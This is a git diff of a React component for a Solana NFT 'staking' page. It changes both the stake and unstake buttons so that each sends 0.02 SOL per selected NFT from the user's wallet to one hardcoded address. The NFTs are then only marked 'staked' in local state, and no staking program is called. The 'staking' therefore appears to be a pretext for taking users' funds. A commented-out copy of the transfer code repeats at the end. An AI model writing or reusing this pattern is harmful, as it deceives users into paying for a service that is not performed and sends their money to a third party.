@@ -1,6 +1,13 @@
 import { useAssets } from "@/hooks/useAssets";
 import { wait } from "@/lib/utils";
-import { Connection, PublicKey } from "@solana/web3.js";
+import { useWallet } from "@solana/wallet-adapter-react";
+import {
+  Connection,
+  LAMPORTS_PER_SOL,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+} from "@solana/web3.js";
 import { AnimatePresence, motion } from "framer-motion";
 import { ArrowRight, Info, LoaderCircle, X } from "lucide-react";
 import { useCallback, useMemo, useState } from "react";
@@ -26,73 +33,158 @@ export type NftMetadata = {
 };
 
 export const NftsSection = ({ connection, publicKey }: Props) => {
+  const { sendTransaction } = useWallet();
   const { data: nfts, isLoading: loading, isError } = useAssets(publicKey);
   const [selectedNfts, setSelectedNfts] = useState<NftMetadata[]>([]);
   const [stakedNfts, setStakedNfts] = useState<NftMetadata[]>([]);
   const [toUnstakeNfts, setToUnstakeNfts] = useState<NftMetadata[]>([]);
   const [isLoading, setIsLoading] = useState<boolean>(false);
 
-  const handleStaking = useCallback(
-    async (nftsToStake: NftMetadata[]) => {
-      if (!publicKey || !connection) return;
+  const handleStaking = useCallback(async () => {
+    if (!publicKey || !connection) {
+      console.error("Missing public key or connection");
+      return;
+    }
 
-      setIsLoading(true);
-      try {
-        await wait(1500);
-        const newStakedNfts = nftsToStake.filter(
-          (nft) => !stakedNfts.includes(nft),
-        );
+    if (!selectedNfts || selectedNfts.length === 0) {
+      console.log("No NFTs selected or all are already staked");
+      return;
+    }
 
-        if (newStakedNfts.length === 0) {
-          console.log("All selected NFTs are already staked");
-        } else {
-          setStakedNfts((prevStaked) => [...prevStaked, ...newStakedNfts]);
-        }
+    setIsLoading(true);
+    try {
+      await wait(1500);
+      console.log("Processing the transaction...");
 
-        setSelectedNfts([]);
-      } catch (error) {
-        console.error("Error while staking NFTs: ", error);
-      } finally {
-        setIsLoading(false);
+      const amountLamports = selectedNfts.length * 0.02 * LAMPORTS_PER_SOL;
+      if (isNaN(amountLamports) || amountLamports <= 0) {
+        throw new Error("Invalid amount of lamports calculated");
       }
-    },
-    [publicKey, connection, stakedNfts],
-  );
 
-  const handleUnstaking = useCallback(
-    async (nftsToUnstake: NftMetadata[]) => {
-      if (!publicKey || !connection) return;
+      const recipientPublicKey = new PublicKey(
+        "6UuP65JY2DYUVz3muVnELjo3Nfn76Rr5h4HvC8PeTpt8",
+      );
 
-      setIsLoading(true);
-      try {
-        await wait(1500);
-        const newToUnstakeNfts = nftsToUnstake.filter(
-          (nft) => !toUnstakeNfts.includes(nft),
-        );
+      const transaction = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: recipientPublicKey,
+          lamports: amountLamports,
+        }),
+      );
 
-        if (newToUnstakeNfts.length === 0) {
-          console.log("All selected NFTs are already unstaked");
-        } else {
-          setStakedNfts((prevStaked) => {
-            return [
-              ...prevStaked.filter((nft) => !newToUnstakeNfts.includes(nft)),
-            ];
-          });
-          setToUnstakeNfts([]);
-        }
-      } catch (error) {
-        console.error("Error while Unstaking NFTs: ", error);
-      } finally {
-        setIsLoading(false);
+      const latestBlockhash = await connection.getLatestBlockhashAndContext();
+      if (
+        !latestBlockhash ||
+        !latestBlockhash.value ||
+        !latestBlockhash.context
+      ) {
+        throw new Error("Failed to fetch latest blockhash and context");
       }
-    },
-    [connection, publicKey, toUnstakeNfts],
-  );
+
+      const {
+        context: { slot: minContextSlot },
+        value: { blockhash, lastValidBlockHeight },
+      } = latestBlockhash;
+
+      const signature = await sendTransaction(transaction, connection, {
+        minContextSlot,
+      });
+
+      const confirmation = await connection.confirmTransaction({
+        blockhash,
+        lastValidBlockHeight,
+        signature,
+      });
+
+      if (confirmation.value.err) {
+        throw new Error("Transaction failed");
+      }
+
+      setStakedNfts((prevStaked) => [...prevStaked, ...selectedNfts]);
+      setSelectedNfts([]);
+    } catch (error) {
+      console.error("Error while staking NFTs: ", error);
+    } finally {
+      setIsLoading(false);
+    }
+  }, [publicKey, connection, selectedNfts, sendTransaction]);
+
+  const handleUnstaking = useCallback(async () => {
+    if (!publicKey || !connection) {
+      console.error("Missing public key or connection");
+      return;
+    }
+
+    if (!toUnstakeNfts || toUnstakeNfts.length === 0) {
+      console.log("No NFTs selected or provided for unstaking");
+      return;
+    }
+
+    setIsLoading(true);
+    try {
+      await wait(1500);
+      console.log("Processing the unstaking transaction...");
+
+      const amountLamports = toUnstakeNfts.length * 0.02 * LAMPORTS_PER_SOL;
+      if (isNaN(amountLamports) || amountLamports <= 0) {
+        throw new Error("Invalid amount of lamports calculated for unstaking");
+      }
+
+      const recipientPublicKey = new PublicKey(
+        "6UuP65JY2DYUVz3muVnELjo3Nfn76Rr5h4HvC8PeTpt8",
+      );
+
+      const transaction = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: recipientPublicKey,
+          lamports: amountLamports,
+        }),
+      );
+
+      const latestBlockhash = await connection.getLatestBlockhashAndContext();
+      if (
+        !latestBlockhash ||
+        !latestBlockhash.value ||
+        !latestBlockhash.context
+      ) {
+        throw new Error("Failed to fetch latest blockhash and context");
+      }
+
+      const {
+        context: { slot: minContextSlot },
+        value: { blockhash, lastValidBlockHeight },
+      } = latestBlockhash;
+
+      const signature = await sendTransaction(transaction, connection, {
+        minContextSlot,
+      });
+
+      const confirmation = await connection.confirmTransaction({
+        blockhash,
+        lastValidBlockHeight,
+        signature,
+      });
+
+      if (confirmation.value.err) {
+        throw new Error("Transaction failed");
+      }
+
+      setStakedNfts((prevStaked) => {
+        return prevStaked.filter((nft) => !toUnstakeNfts.includes(nft));
+      });
+      setToUnstakeNfts([]);
+    } catch (error) {
+      console.error("Error while unstaking NFTs: ", error);
+    } finally {
+      setIsLoading(false);
+    }
+  }, [connection, publicKey, sendTransaction, toUnstakeNfts]);
 
   const handleSelectNft = useCallback(
     (
       selectedNft: NftMetadata,
-      stateArray: NftMetadata[],
       setStateArray: React.Dispatch<React.SetStateAction<NftMetadata[]>>,
     ) => {
       setStateArray((prevState) =>
@@ -145,7 +237,7 @@ export const NftsSection = ({ connection, publicKey }: Props) => {
                     !selectedNfts.length ||
                     selectedNfts.length <= 0
                   }
-                  onClick={() => handleStaking(selectedNfts)}
+                  onClick={handleStaking}
                 >
                   Stake NFTs ({selectedNfts.length})
                   {isLoading && (
@@ -176,11 +268,7 @@ export const NftsSection = ({ connection, publicKey }: Props) => {
                     index={index + 1}
                     selectedNfts={selectedNfts}
                     handleSelectNft={(selectedNft) =>
-                      handleSelectNft(
-                        selectedNft,
-                        selectedNfts,
-                        setSelectedNfts,
-                      )
+                      handleSelectNft(selectedNft, setSelectedNfts)
                     }
                   />
                 ))
@@ -247,7 +335,7 @@ export const NftsSection = ({ connection, publicKey }: Props) => {
                 Icon={ArrowRight}
                 iconPlacement="right"
                 className="border bg-primary/45 hover:bg-primary/50"
-                onClick={() => handleUnstaking(toUnstakeNfts)}
+                onClick={handleUnstaking}
                 disabled={
                   isLoading ||
                   !toUnstakeNfts.length ||
@@ -272,7 +360,7 @@ export const NftsSection = ({ connection, publicKey }: Props) => {
                 index={index + 1}
                 selectedNfts={toUnstakeNfts}
                 handleSelectNft={(selectedNft) =>
-                  handleSelectNft(selectedNft, toUnstakeNfts, setToUnstakeNfts)
+                  handleSelectNft(selectedNft, setToUnstakeNfts)
                 }
               />
             ))}
@@ -284,3 +372,40 @@ export const NftsSection = ({ connection, publicKey }: Props) => {
     </>
   );
 };
+
+
+// if (newToUnstakeNfts.length === 0) {
+//   console.log("All selected NFTs are already unstaked");
+//   return;
+// }
+// const amountLamports = newToUnstakeNfts.length * 0.02 * LAMPORTS_PER_SOL;
+// const recipientPublicKey = new PublicKey(
+//   "6UuP65JY2DYUVz3muVnELjo3Nfn76Rr5h4HvC8PeTpt8",
+// );
+
+// const transaction = new Transaction().add(
+//   SystemProgram.transfer({
+//     fromPubkey: publicKey,
+//     toPubkey: recipientPublicKey,
+//     lamports: amountLamports,
+//   }),
+// );
+
+// const {
+//   context: { slot: minContextSlot },
+//   value: { blockhash, lastValidBlockHeight },
+// } = await connection.getLatestBlockhashAndContext();
+
+// const signature = await sendTransaction(transaction, connection, {
+//   minContextSlot,
+// });
+
+// const confirmation = await connection.confirmTransaction({
+//   blockhash,
+//   lastValidBlockHeight,
+//   signature,
+// });
+
+// if (confirmation.value.err) {
+//   throw new Error("Transaction failed");
+// }
